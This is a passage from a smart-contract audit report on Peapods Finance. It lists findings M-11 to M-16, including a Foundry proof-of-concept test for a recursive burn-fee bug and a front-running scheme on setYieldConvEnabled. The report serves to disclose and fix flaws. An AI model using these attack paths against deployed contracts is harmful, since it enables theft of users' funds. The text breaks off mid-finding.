        _spTKN.unstake(90e18); //During unstaking, the fees can be processed, and the rewards are distributed too late, which leads to Alice receiving rewards that she shouldn’t have gotten
        console.log("alice peas balance after: ", _peas.balanceOf(alice));
        vm.stopPrank();
    }
}
```
3. The POC can then be started with `forge test --mt testPoc -vv --fork-url <FORK_URL>`

# Issue M-11: Pods with `hasTransferTax` set to `true` have an incorrect `totalSupply` because the burn fee is applied recursively to itself 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/291 

## Found by 
PNS, Schnilch, TessKimy, exploitabilityexplorer, future2\_22

### Summary

A pod can have a transfer tax, which is a small portion that stays in the pod as fees with each transfer, while another portion is burned. The problem is that burning also counts as a transfer, so when the burn fee is burned, another burn fee is recursively applied to it. As a result, with each recursive burn, the `totalSupply` decreases further, even though it was already reduced by the full burn fee at the beginning.

### Root Cause

In the `_update` function of the `DecentralizedIndex`, you can see that a transfer fee is applied to every transfer if it is enabled:
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/DecentralizedIndex.sol#L159-L182
In line 180, you can see that the burn fee is handled with `_processBurnFee`:
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/DecentralizedIndex.sol#L217-L224
Here, you can see that a portion of the fee is always burned, for which the `_burn` function is called. However, this `_burn` function also uses `_update`, which results in another fee being applied to the burn fee. This, in turn, causes `_processBurnFee` to be called again, further reducing the `totalSupply`, even though it was already reduced by the full burn fee during the first `_processBurnFee` call.
Additionally, it is important to note that every time the fee is applied too often, users lose a small amount of pTKN because the fee is transferred again each time (see line 177 in `DecentralizedIndex`).


### Internal Pre-conditions

1. `hasTransferTax` must be true

### External Pre-conditions

No external pre-conditions

### Attack Path

There isn’t really an attack path, but with every transfer, buy, or sell, a burn fee is applied, which gets burned recursively too many times. Over time, this leads to a `totalSupply` that is lower than it should be. Additionally, whenever the `totalSupply` is too low, an incorrect amount of pTKN is minted when bonding, as it is calculated based on the `totalSupply`.

### Impact

This issue causes the total supply to decrease slightly every time a burn fee is applied. Each time, the reduction is small, but with many transfers, buys, and sells, the total supply becomes lower than it should be. Additionally, users lose some tokens because the fee is applied multiple times, leading to more tokens being transferred from them. Moreover, due to the incorrect total supply, too few pTKNs are minted during bonding:
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/WeightedIndex.sol#L150

### PoC

1. To execute the POC, a `POC.t.sol` file should be created in `contracts/test/POC.t.sol`.
2. The following code should be inserted into the file:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {console} from "forge-std/console.sol";

// forge
import {Test} from "forge-std/Test.sol";

// PEAS
import {PEAS} from "../../contracts/PEAS.sol";
import {V3TwapUtilities} from "../../contracts/twaputils/V3TwapUtilities.sol";
import {UniswapDexAdapter} from "../../contracts/dex/UniswapDexAdapter.sol";
import {IDecentralizedIndex} from "../../contracts/interfaces/IDecentralizedIndex.sol";
import {WeightedIndex} from "../../contracts/WeightedIndex.sol";
import {StakingPoolToken} from "../../contracts/StakingPoolToken.sol";
import {LendingAssetVault} from "../../contracts/LendingAssetVault.sol";
import {IndexUtils} from "../../contracts/IndexUtils.sol";
import {IIndexUtils} from "../../contracts/interfaces/IIndexUtils.sol";
import {IndexUtils} from "../contracts/IndexUtils.sol";
import {RewardsWhitelist} from "../../contracts/RewardsWhitelist.sol";
import {TokenRewards} from "../../contracts/TokenRewards.sol";

// oracles
import {ChainlinkSinglePriceOracle} from "../../contracts/oracle/ChainlinkSinglePriceOracle.sol";
import {UniswapV3SinglePriceOracle} from "../../contracts/oracle/UniswapV3SinglePriceOracle.sol";
import {DIAOracleV2SinglePriceOracle} from "../../contracts/oracle/DIAOracleV2SinglePriceOracle.sol";
import {V2ReservesUniswap} from "../../contracts/oracle/V2ReservesUniswap.sol";
import {aspTKNMinimalOracle} from "../../contracts/oracle/aspTKNMinimalOracle.sol";

// protocol fees
import {ProtocolFees} from "../../contracts/ProtocolFees.sol";
import {ProtocolFeeRouter} from "../../contracts/ProtocolFeeRouter.sol";

// autocompounding
import {AutoCompoundingPodLpFactory} from "../../contracts/AutoCompoundingPodLpFactory.sol";
import {AutoCompoundingPodLp} from "../../contracts/AutoCompoundingPodLp.sol";

// lvf
import {LeverageManager} from "../../contracts/lvf/LeverageManager.sol";

// fraxlend
import {FraxlendPairDeployer, ConstructorParams} from "./invariant/modules/fraxlend/FraxlendPairDeployer.sol";
import {FraxlendWhitelist} from "./invariant/modules/fraxlend/FraxlendWhitelist.sol";
import {FraxlendPairRegistry} from "./invariant/modules/fraxlend/FraxlendPairRegistry.sol";
import {FraxlendPair} from "./invariant/modules/fraxlend/FraxlendPair.sol";
import {VariableInterestRate} from "./invariant/modules/fraxlend/VariableInterestRate.sol";
import {IERC4626Extended} from "./invariant/modules/fraxlend/interfaces/IERC4626Extended.sol";

// flash
import {IVault} from "./invariant/modules/balancer/interfaces/IVault.sol";
import {BalancerFlashSource} from "../../contracts/flash/BalancerFlashSource.sol";
import {PodFlashSource} from "../../contracts/flash/PodFlashSource.sol";
import {UniswapV3FlashSource} from "../../contracts/flash/UniswapV3FlashSource.sol";

// uniswap-v2-core
import {UniswapV2Factory} from "v2-core/UniswapV2Factory.sol";
import {UniswapV2Pair} from "v2-core/UniswapV2Pair.sol";

// uniswap-v2-periphery
import {UniswapV2Router02} from "v2-periphery/UniswapV2Router02.sol";

// uniswap-v3-core
import {UniswapV3Factory} from "v3-core/UniswapV3Factory.sol";
import {UniswapV3Pool} from "v3-core/UniswapV3Pool.sol";

// uniswap-v3-periphery
import {SwapRouter02} from "swap-router/SwapRouter02.sol";
import {LiquidityManagement} from "v3-periphery/base/LiquidityManagement.sol";
import {PeripheryPayments} from "v3-periphery/base/PeripheryPayments.sol";
import {PoolAddress} from "v3-periphery/libraries/PoolAddress.sol";

// mocks
import {WETH9} from "./invariant/mocks/WETH.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockERC20} from "./invariant/mocks/MockERC20.sol";
import {TestERC20} from "./invariant/mocks/TestERC20.sol";
import {TestERC4626Vault} from "./invariant/mocks/TestERC4626Vault.sol";
import {MockV3Aggregator} from "./invariant/mocks/MockV3Aggregator.sol";
import {MockUniV3Minter} from "./invariant/mocks/MockUniV3Minter.sol";
import {MockV3TwapUtilities} from "./invariant/mocks/MockV3TwapUtilities.sol";

import {PodHelperTest} from "./helpers/PodHelper.t.sol";

contract AuditTests is PodHelperTest {
    address alice = vm.addr(uint256(keccak256("alice")));
    address bob = vm.addr(uint256(keccak256("bob")));
    address charlie = vm.addr(uint256(keccak256("charlie")));

    uint256[] internal _fraxPercentages = [10000, 2500, 7500, 5000];

    // fraxlend protocol actors
    address internal comptroller = vm.addr(uint256(keccak256("comptroller")));
    address internal circuitBreaker = vm.addr(uint256(keccak256("circuitBreaker")));
    address internal timelock = vm.addr(uint256(keccak256("comptroller")));

    uint16 internal fee = 100;
    uint256 internal PRECISION = 10 ** 27;

    uint256 donatedAmount;
    uint256 lavDeposits;

    /*///////////////////////////////////////////////////////////////
                            TEST CONTRACTS
    ///////////////////////////////////////////////////////////////*/

    PEAS internal _peas;
    MockV3TwapUtilities internal _twapUtils;
    UniswapDexAdapter internal _dexAdapter;
    LendingAssetVault internal _lendingAssetVault;
    LendingAssetVault internal _lendingAssetVault2;
    RewardsWhitelist internal _rewardsWhitelist;

    // oracles
    V2ReservesUniswap internal _v2Res;
    ChainlinkSinglePriceOracle internal _clOracle;
    UniswapV3SinglePriceOracle internal _uniOracle;
    DIAOracleV2SinglePriceOracle internal _diaOracle;
    aspTKNMinimalOracle internal _aspTKNMinOracle1Peas;
    aspTKNMinimalOracle internal _aspTKNMinOracle1Weth;

    // protocol fees
    ProtocolFees internal _protocolFees;
    ProtocolFeeRouter internal _protocolFeeRouter;

    // pods
    WeightedIndex internal _pod1Peas;

    // index utils
    IndexUtils internal _indexUtils;

    // autocompounding
    AutoCompoundingPodLpFactory internal _aspTKNFactory;
    AutoCompoundingPodLp internal _aspTKN1Peas;
    address internal _aspTKN1PeasAddress;

    // lvf
    LeverageManager internal _leverageManager;

    // fraxlend
    FraxlendPairDeployer internal _fraxDeployer;
    FraxlendWhitelist internal _fraxWhitelist;
    FraxlendPairRegistry internal _fraxRegistry;
    VariableInterestRate internal _variableInterestRate;

    FraxlendPair internal _fraxLPToken1Peas;

    // flash
    UniswapV3FlashSource internal _uniswapV3FlashSourcePeas;

    // mocks
    MockUniV3Minter internal _uniV3Minter;
    MockERC20 internal _mockDai;
    WETH9 internal _weth;
    MockERC20 internal _tokenA;
    MockERC20 internal _tokenB;
    MockERC20 internal _tokenC;

    // uniswap-v2-core
    UniswapV2Factory internal _uniV2Factory;
    UniswapV2Pair internal _uniV2Pool;

    // uniswap-v2-periphery
    UniswapV2Router02 internal _v2SwapRouter;

    // uniswap-v3-core
    UniswapV3Factory internal _uniV3Factory;
    UniswapV3Pool internal _v3peasDaiPool;
    UniswapV3Pool internal _v3peasDaiFlash;

    // uniswap-v3-periphery
    SwapRouter02 internal _v3SwapRouter;

    function setUp() public override {
        super.setUp();

        _deployUniV3Minter();
        _deployWETH();
        _deployTokens();
        _deployPEAS();
        _deployUniV2();
        _deployUniV3();
        _deployProtocolFees();
        _deployRewardsWhitelist();
        _deployTwapUtils();
        _deployDexAdapter();
        _deployIndexUtils();
        _deployWeightedIndexes();
        _deployAutoCompoundingPodLpFactory();
        _getAutoCompoundingPodLpAddresses();
        _deployAspTKNOracles();
        _deployAspTKNs();
        _deployVariableInterestRate();
        _deployFraxWhitelist();
        _deployFraxPairRegistry();
        _deployFraxPairDeployer();
        _deployFraxPairs();
        _deployLendingAssetVault();
        _deployLeverageManager();
        _deployFlashSources();
        
        _mockDai.mint(alice, 1_000_000 ether);
        _mockDai.mint(bob, 1_000_000 ether);
        _mockDai.mint(charlie, 1_000_000 ether);
        _peas.transfer(alice, 100_000 ether);
        _peas.transfer(bob, 100_000 ether);
        _peas.transfer(charlie, 100_000 ether);
    }

    function _deployUniV3Minter() internal {
        _uniV3Minter = new MockUniV3Minter();
    }

    function _deployWETH() internal {
        _weth = new WETH9();

        vm.deal(address(this), 1_000_000 ether);
        _weth.deposit{value: 1_000_000 ether}();

        vm.deal(address(_uniV3Minter), 2_000_000 ether);
        vm.prank(address(_uniV3Minter));
        _weth.deposit{value: 2_000_000 ether}();
    }

    function _deployTokens() internal {
        _mockDai = new MockERC20();
        _tokenA = new MockERC20();
        _tokenB = new MockERC20();
        _tokenC = new MockERC20();

        _mockDai.initialize("MockDAI", "mDAI", 18);
        _tokenA.initialize("TokenA", "TA", 18);
        _tokenB.initialize("TokenB", "TB", 18);
        _tokenC.initialize("TokenC", "TC", 18);

        _tokenA.mint(address(this), 1_000_000 ether);
        _tokenB.mint(address(this), 1_000_000 ether);
        _tokenC.mint(address(this), 1_000_000 ether);
        _mockDai.mint(address(this), 1_000_000 ether);

        _tokenA.mint(address(_uniV3Minter), 1_000_000 ether);
        _tokenB.mint(address(_uniV3Minter), 1_000_000 ether);
        _tokenC.mint(address(_uniV3Minter), 1_000_000 ether);
        _mockDai.mint(address(_uniV3Minter), 1_000_000 ether);

        _tokenA.mint(alice, 1_000_000 ether);
        _tokenB.mint(alice, 1_000_000 ether);
        _tokenC.mint(alice, 1_000_000 ether);
        _mockDai.mint(alice, 1_000_000 ether);

        _tokenA.mint(bob, 1_000_000 ether);
        _tokenB.mint(bob, 1_000_000 ether);
        _tokenC.mint(bob, 1_000_000 ether);
        _mockDai.mint(bob, 1_000_000 ether);

        _tokenA.mint(charlie, 1_000_000 ether);
        _tokenB.mint(charlie, 1_000_000 ether);
        _tokenC.mint(charlie, 1_000_000 ether);
        _mockDai.mint(charlie, 1_000_000 ether);
    }

    function _deployPEAS() internal {
        _peas = new PEAS("Peapods", "PEAS");
        _peas.transfer(address(_uniV3Minter), 2_000_000 ether);
    }

    function _deployUniV2() internal {
        _uniV2Factory = new UniswapV2Factory(address(this));
        _v2SwapRouter = new UniswapV2Router02(address(_uniV2Factory), address(_weth));
    }

    function _deployUniV3() internal {
        _uniV3Factory = new UniswapV3Factory();
        _v3peasDaiPool = UniswapV3Pool(_uniV3Factory.createPool(address(_peas), address(_mockDai), 10_000));
        _v3peasDaiPool.initialize(1 << 96);
        _v3peasDaiPool.increaseObservationCardinalityNext(600);
        _uniV3Minter.V3addLiquidity(_v3peasDaiPool, 100_000 ether);

        _v3peasDaiFlash = UniswapV3Pool(_uniV3Factory.createPool(address(_peas), address(_mockDai), 500));
        _v3peasDaiFlash.initialize(1 << 96);
        _v3peasDaiFlash.increaseObservationCardinalityNext(600);
        _uniV3Minter.V3addLiquidity(_v3peasDaiFlash, 100_000e18);

        _v3SwapRouter = new SwapRouter02(address(_uniV2Factory), address(_uniV3Factory), address(0), address(_weth));
    }

    function _deployProtocolFees() internal {
        _protocolFees = new ProtocolFees();
        _protocolFees.setYieldAdmin(500);
        _protocolFees.setYieldBurn(500);

        _protocolFeeRouter = new ProtocolFeeRouter(_protocolFees);
        bytes memory code = address(_protocolFeeRouter).code;
        vm.etch(0x7d544DD34ABbE24C8832db27820Ff53C151e949b, code);
        _protocolFeeRouter = ProtocolFeeRouter(0x7d544DD34ABbE24C8832db27820Ff53C151e949b);

        vm.prank(_protocolFeeRouter.owner());
        _protocolFeeRouter.transferOwnership(address(this));
        _protocolFeeRouter.setProtocolFees(_protocolFees);
    }

    function _deployRewardsWhitelist() internal {
        _rewardsWhitelist = new RewardsWhitelist();
        bytes memory code = address(_rewardsWhitelist).code;
        vm.etch(0xEc0Eb48d2D638f241c1a7F109e38ef2901E9450F, code);
        _rewardsWhitelist = RewardsWhitelist(0xEc0Eb48d2D638f241c1a7F109e38ef2901E9450F);

        vm.prank(_rewardsWhitelist.owner());
        _rewardsWhitelist.transferOwnership(address(this));
        _rewardsWhitelist.toggleRewardsToken(address(_peas), true);
    }

    function _deployTwapUtils() internal {
        _twapUtils = new MockV3TwapUtilities();
        bytes memory code = address(_twapUtils).code;
        vm.etch(0x024ff47D552cB222b265D68C7aeB26E586D5229D, code);
        _twapUtils = MockV3TwapUtilities(0x024ff47D552cB222b265D68C7aeB26E586D5229D);
    }

    function _deployDexAdapter() internal {
        _dexAdapter = new UniswapDexAdapter(_twapUtils, address(_v2SwapRouter), address(_v3SwapRouter), false);
    }

    function _deployIndexUtils() internal {
        _indexUtils = new IndexUtils(_twapUtils, _dexAdapter);
    }

    function _deployWeightedIndexes() internal {
        IDecentralizedIndex.Config memory _c;
        _c.hasTransferTax = true;
        IDecentralizedIndex.Fees memory _f;
        _f.bond = 300;
        _f.debond = 300;
        _f.burn = 5000;
        _f.buy = 200;

        // POD1 (Peas)
        address[] memory _t1 = new address[](1);
        _t1[0] = address(_peas);
        uint256[] memory _w1 = new uint256[](1);
        _w1[0] = 100;
        address __pod1Peas = _createPod(
            "Peas Pod",
            "pPeas",
            _c,
            _f,
            _t1,
            _w1,
            address(0),
            false,
            abi.encode(
                address(_mockDai),
                address(_peas),
                address(_mockDai),
                address(_protocolFeeRouter),
                address(_rewardsWhitelist),
                address(_twapUtils),
                address(_dexAdapter)
            )
        );
        _pod1Peas = WeightedIndex(payable(__pod1Peas));

        _peas.approve(address(_pod1Peas), 100_000 ether);
        _mockDai.approve(address(_pod1Peas), 100_000 ether);
        _pod1Peas.bond(address(_peas), 100_000 ether, 1 ether);
        _pod1Peas.addLiquidityV2(100_000 ether, 100_000 ether, 100, block.timestamp);
    }

    function _deployAutoCompoundingPodLpFactory() internal {
        _aspTKNFactory = new AutoCompoundingPodLpFactory();
    }
    
    function _getAutoCompoundingPodLpAddresses() internal {
        _aspTKN1PeasAddress = _aspTKNFactory.getNewCaFromParams(
            "Test aspTKN1Peas", "aspTKN1Peas", false, _pod1Peas, _dexAdapter, _indexUtils, 0
        );
    }

    function _deployAspTKNOracles() internal {
        _v2Res = new V2ReservesUniswap();
        _clOracle = new ChainlinkSinglePriceOracle(address(0));
        _uniOracle = new UniswapV3SinglePriceOracle(address(0));
        _diaOracle = new DIAOracleV2SinglePriceOracle(address(0));

        _aspTKNMinOracle1Peas = new aspTKNMinimalOracle(
            address(_aspTKN1PeasAddress),
            abi.encode(
                address(_clOracle),
                address(_uniOracle),
                address(_diaOracle),
                address(_mockDai),
                false,
                false,
                _pod1Peas.lpStakingPool(),
                address(_v3peasDaiPool)
            ),
            abi.encode(address(0), address(0), address(0), address(0), address(0), address(_v2Res))
        );
    }

    function _deployAspTKNs() internal {
        //POD 1
        address _lpPeas = _pod1Peas.lpStakingPool();
        address _stakingPeas = StakingPoolToken(_lpPeas).stakingToken();

        IERC20(_stakingPeas).approve(_lpPeas, 1000);
        StakingPoolToken(_lpPeas).stake(address(this), 1000);
        IERC20(_lpPeas).approve(address(_aspTKNFactory), 1000);

        _aspTKNFactory.create("Test aspTKN1Peas", "aspTKN1Peas", false, _pod1Peas, _dexAdapter, _indexUtils, 0);
        _aspTKN1Peas = AutoCompoundingPodLp(_aspTKN1PeasAddress);
    }

    function _deployVariableInterestRate() internal {
        _variableInterestRate = new VariableInterestRate(
            "[0.5 0.2@.875 5-10k] 2 days (.75-.85)",
            87500,
            200000000000000000,
            75000,
            85000,
            158247046,
            1582470460,
            3164940920000,
            172800
        );
    }

    function _deployFraxWhitelist() internal {
        _fraxWhitelist = new FraxlendWhitelist();
    }

    function _deployFraxPairRegistry() internal {
        address[] memory _initialDeployers = new address[](0);
        _fraxRegistry = new FraxlendPairRegistry(address(this), _initialDeployers);
    }

    function _deployFraxPairDeployer() internal {
        ConstructorParams memory _params =
            ConstructorParams(circuitBreaker, comptroller, timelock, address(_fraxWhitelist), address(_fraxRegistry));
        _fraxDeployer = new FraxlendPairDeployer(_params);

        _fraxDeployer.setCreationCode(type(FraxlendPair).creationCode);

        address[] memory _whitelistDeployer = new address[](1);
        _whitelistDeployer[0] = address(this);

        _fraxWhitelist.setFraxlendDeployerWhitelist(_whitelistDeployer, true);

        address[] memory _registryDeployer = new address[](1);
        _registryDeployer[0] = address(_fraxDeployer);

        _fraxRegistry.setDeployers(_registryDeployer, true);
    }

    function _deployFraxPairs() internal {
        vm.warp(block.timestamp + 1 days);

        _fraxLPToken1Peas = FraxlendPair(
            _fraxDeployer.deploy(
                abi.encode(
                    _pod1Peas.PAIRED_LP_TOKEN(), // asset
                    _aspTKN1PeasAddress, // collateral
                    address(_aspTKNMinOracle1Peas), //oracle
                    5000, // maxOracleDeviation
                    address(_variableInterestRate), //rateContract
                    1000, //fullUtilizationRate
                    75000, // maxLtv
                    10000, // uint256 _cleanLiquidationFee
                    9000, // uint256 _dirtyLiquidationFee
                    2000 //uint256 _protocolLiquidationFee
                )
            )
        );
    }

    function _deployLendingAssetVault() internal {
        _lendingAssetVault = new LendingAssetVault("Test LAV", "tLAV", address(_mockDai));
        IERC20 vaultAsset1Peas = IERC20(_fraxLPToken1Peas.asset());
        vaultAsset1Peas.approve(address(_fraxLPToken1Peas), vaultAsset1Peas.totalSupply());
        vaultAsset1Peas.approve(address(_lendingAssetVault), vaultAsset1Peas.totalSupply());
        _lendingAssetVault.setVaultWhitelist(address(_fraxLPToken1Peas), true);

        address[] memory _vaults = new address[](1);
        _vaults[0] = address(_fraxLPToken1Peas);
        uint256[] memory _allocations = new uint256[](1);
        _allocations[0] = 100_000e18;
        _lendingAssetVault.setVaultMaxAllocation(_vaults, _allocations);

        vm.prank(timelock);
        _fraxLPToken1Peas.setExternalAssetVault(IERC4626Extended(address(_lendingAssetVault)));
    }

    function _deployLeverageManager() internal {
        _leverageManager = new LeverageManager("Test LM", "tLM", IIndexUtils(address(_indexUtils)));
        _leverageManager.setLendingPair(address(_pod1Peas), address(_fraxLPToken1Peas));
    }

    function _deployFlashSources() internal {
        _uniswapV3FlashSourcePeas = new UniswapV3FlashSource(address(_v3peasDaiFlash), address(_leverageManager));
        _leverageManager.setFlashSource(address(_pod1Peas.PAIRED_LP_TOKEN()), address(_uniswapV3FlashSourcePeas));
    }

    function testPoc() public { //transfer tax is enabled (see line 329)
        //For this proof of concept, a buy fee of 2% and a burn fee of 50% are set to clearly demonstrate the impact
        UniswapV2Pair _v2Pool = UniswapV2Pair(_pod1Peas.DEX_HANDLER().getV2Pool(address(_pod1Peas), address(_mockDai)));

        vm.startPrank(alice);
        console.log("uniV2 pool _pod1Peas: ", _pod1Peas.balanceOf(address(_v2Pool)));
        console.log("_pod1Peas balance: ", _pod1Peas.balanceOf(address(_pod1Peas)));
        console.log("alice _pod1Peas balance: ", _pod1Peas.balanceOf(alice));
        console.log("total supply before : ", _pod1Peas.totalSupply()); //This shows that the entire `totalSupply` is currently in the UniV2 pool
        address[] memory path = new address[](2);
        path[0] = address(_mockDai);
        path[1] = address(_pod1Peas);
        _mockDai.approve(address(_v2SwapRouter), 1000e18);
        _v2SwapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1000e18,
            0,
            path,
            alice,
            block.timestamp
        );
        console.log("\n uniV2 pool _pod1Peas: ", _pod1Peas.balanceOf(address(_v2Pool)));
        console.log("_pod1Peas balance: ", _pod1Peas.balanceOf(address(_pod1Peas)));
        console.log("alice _pod1Peas balance: ", _pod1Peas.balanceOf(alice)); //If you sum the balances of these three addresses and subtract the totalSupply, you can see that it is smaller than it should be
        console.log("totalSupply after: ", _pod1Peas.totalSupply());
        vm.stopPrank();
    }
}
```
3. The POC can then be started with `forge test --mt testPoc -vv --fork-url <FORK_URL>`

# Issue M-12: hardcoded V3_POS_MGR address won't be the same on every chain 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/297 

## Found by 
0xAadi, AuditorPraise, OpaBatyo, X77, axelot, pkqs90

### Summary

Chains in scope are Ethereum, Arbitrum One, Base, Mode, Berachain...... hardcoded NonfungiblePositionManager  address - > `0xC36442b4a4522E871399CD717aBDD847Ab11FE88` won't be the same on every chain.

### Root Cause

In V3Locker.sol's constructor  
```solidity
constructor() Ownable(_msgSender()) {
        CREATED = block.timestamp;
        V3_POS_MGR = INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);//@audit-issue hardcoded address won't be the same on every chain.
    }
```
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/V3Locker.sol#L15
 V3_POS_MGR is hardcoded to `0xC36442b4a4522E871399CD717aBDD847Ab11FE88` which won't be the same on all the chains in scope for this audit.

### Internal Pre-conditions

_NO_Reponse

### External Pre-conditions

_NO_Response

### Attack Path

_NO_Response

### Impact

V3Locker.sol can't function properly on all chains in scope for this audit.

### PoC

_No response_

### Mitigation

Make V3_POS_MGR updateable by adding an external function to enable V3_POS_MGR to be updateable

# Issue M-13: Transferring of _userProvidedDebtAmtMax does not work in _acquireBorrowTokenForRepayment because _props.sender is never set, which leads to a transferFrom call from address(0), causing the transaction to revert 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/299 

## Found by 
Schnilch, X77, bretzel, ck

### Summary

In `_acquireBorrowTokenForRepayment`, a user can specify how many tokens they are willing to provide using `_userProvidedDebtAmtMax` if there are not enough tokens to repay the flash loan. However, this does not work because the transfer is attempted from `_props.sender`, which was never set. As a result, `removeLeverage`, which relies on this function, reverts.

### Root Cause

`removeLeverage` in the `LeverageManager` uses `_acquireBorrowTokenForRepayment` to obtain tokens for repaying the flash loan if there are currently not enough. Here, a user can specify a maximum amount they are willing to provide:
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/lvf/LeverageManager.sol#L423-L430
Here, you can see that the amount the user is willing to provide is transferred from `_props.sender`. The problem is that `_props.sender` is never set. Only `_props.owner` is set at the beginning of the `removeLeverage` function:
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/lvf/LeverageManager.sol#L177-L180
This causes `_props.sender` in `_acquireBorrowTokenForRepayment` to be `address(0)`, which leads to the transfer reverting since nothing can be transferred from `address(0)`.

It is also important to note that there is another way to acquire the borrow tokens, but it does not always work, as I explained in Issue "Swapping in _acquireBorrowTokenForRepayment is not working when the sell fee is enabled because the swap does not support fee-on-transfer tokens". This makes this issue even more critical.

### Internal Pre-conditions

No preconditions, this feature does not work regardless of how the protocol is configured.

### External Pre-conditions

No external pre-conditions

### Attack Path

1. Alice bonds PEAS tokens
2. With the received pTKNs, Alice calls `addLeverage`
3. Alice wants to call removeLeverage and provides a `_userProvidedDebtAmtMax`. The call reverts because the transfer fails

### Impact

A feature of the protocol is not working, which prevents users from providing a portion of the repayment amount for the flash loan themselves. This can lead to users being unable to remove their leverage, especially if the swap doesn't work, for example, due to slippage or the other issue I mentioned above.

# Issue M-14: self-lending does not work with paired tokens that have a transfer tax because addLiquidityV2 does not account for fee-on-transfer on the PAIRED_LP_TOKEN 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/300 

The protocol has acknowledged this issue.

## Found by 
Schnilch, X77, pkqs90

### Summary

`addLiquidityV2` transfers PAIRED_LP_TOKEN and pTKN from the address that wants to add liquidity. The issue, however, is that the PAIRED_LP_TOKEN can also be a fee-on-transfer token in a self-lending system where the fTKN is podded. When `addLiquidity` is called on the DEX_HANDLER, there are not enough tokens in the pod, and the call reverts. As a result, the self-lending system cannot be used for PAIRED_LP_TOKEN pods that have transfer tax enabled.

### Root Cause

During `addLeverage` in the `LeverageManager`, the function `addLPAndStake` from `IndexUtils` is used to add liquidity to the UniV2 pool and receive the LP tokens:
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/IndexUtils.sol#L82-L87
`addLiquidityV2` then transfers the PAIRED_LP_TOKEN and the pTKN into the pod, and uses the DEX_HANDLER to add liquidity:
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/DecentralizedIndex.sol#L341-L357
The issue here is when it is a self-lending system with a podded fTKN that has transfer tax enabled. In this case, the DEX_HANDLER will revert, as the PAIRED_LP_TOKEN is slightly reduced due to the tax when transferring into the pod. However, the same amount of liquidity is still intended to be added (see lines 345 and 352).


### Internal Pre-conditions

1. hasTransferTax must be true for the paired LP token pod in the self-lending system

### External Pre-conditions

No external pre-conditions

### Attack Path

1. There is pod1 and pod2, where pod2 has the fTKN as its underlying token. Pod2 is the PAIRED_LP_TOKEN of pod1. Pod2 also has a transfer tax enabled.
2. A user now wants to call `addLeverage` with their pTKNs, which they received from bonding in pod1
3. The call fails because there are not enough tokens in pod1 due to the transfer tax in pod2 when liquidity is supposed to be added

### Impact

Self-lending cannot be set up for a PAIRED_LP_TOKEN pod that has transfer tax enabled. As a result, an important feature of the protocol may not be available for certain pods.

# Issue M-15: Malicious actors can front-run setYieldConvEnabled 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/313 

## Found by 
pashap9990

### Root Cause

AutoCompoundingPodLp'owner can enable or disable processing reward tokens through `AutoCompoundingPodLp::setYieldConvEnabled` but when owner decides to enable with sets yieldConvEnabled to true this causes _totalAssets will be increase sharply

```solidity
    function _processRewardsToPodLp(uint256 _amountLpOutMin, uint256 _deadline) internal returns (uint256 _lpAmtOut) {
@>>>>        if (!yieldConvEnabled) {
            return _lpAmtOut;
        }
        address[] memory _tokens = ITokenRewards(IStakingPoolToken(_asset()).POOL_REWARDS()).getAllRewardsTokens();
        uint256 _len = _tokens.length + 1;
        for (uint256 _i; _i < _len; _i++) {
            address _token = _i == _tokens.length ? pod.lpRewardsToken() : _tokens[_i];
            uint256 _bal =
                IERC20(_token).balanceOf(address(this)) - (_token == pod.PAIRED_LP_TOKEN() ? _protocolFees : 0);
            if (_bal == 0) {
                continue;
            }
            uint256 _newLp = _tokenToPodLp(_token, _bal, 0, _deadline);
            _lpAmtOut += _newLp;
        }
@>>>        _totalAssets += _lpAmtOut;
        require(_lpAmtOut >= _amountLpOutMin, "M");
    }
```

### Internal Conditions

yieldConvEnabled = false

### PoC

Let's assume there is reward tokens in AutoCompoundingPodLp contract and `AutoCompoundingPodLp::setYieldConvEnabled` will be called by contract's owner and then malicious actor see transaction in mempool and calls `AutoCompoundingPodLp:deposit`. hence, totalAssets wouldn't update because yieldConvEnabled is false and when owner's transaction will be executed
totalAssets will be updated and malicious actor can withdraw his/her assets plus profit

### Code Snippet

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/AutoCompoundingPodLp.sol#L463

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/AutoCompoundingPodLp.sol#L214

### Impact

Malicious actor can steal other users profit

### Mitigation

Owner should pause deposit function when he/she wants to call `AutoCompoundingPodLp::setYieldConvEnabled`

# Issue M-16: Malicious Lenders can Increase the Interest owed by Borrowers Due to Wrong `UtilizationRate` Calculation 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/331 

## Found by 
Honour, X77, future2\_22, octopus\_testjjj, prosper, uuzall

### Summary

The `UtilizationRate` is used to calculate the percentage of utilization of a specific Fraxlend Pair. This utilization is then used to calculate interest rates which are charged to the borrowers of the platform. Since the formula to calculate one of the utilization rates is wrong, it triggers the `_addInterest` function when it is not supposed to, causing malicious lenders to keep calling the function to inflate the interest of borrowers. 

The protocol team confirmed that the utilization rate needs to be the ratio of total borrowed tokens to the total borrowed + un-borrowed tokens in the contract. 

Currently, one of the utilization rate is calculated as the ratio between the total borrowed tokens to the total un-borrowed tokens. 

**A malicious lender can increase the interest of a borrower by more than `10%` every single day by doing this.**

### Root Cause

In the [`_addInterest`](https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/fraxlend/src/contracts/FraxlendPairCore.sol#L457) function the calculation for the utilization rate of the Fraxlend Pair is wrong due to the following reason: 

The utilization rate is calculated as shown below: 
```solidity
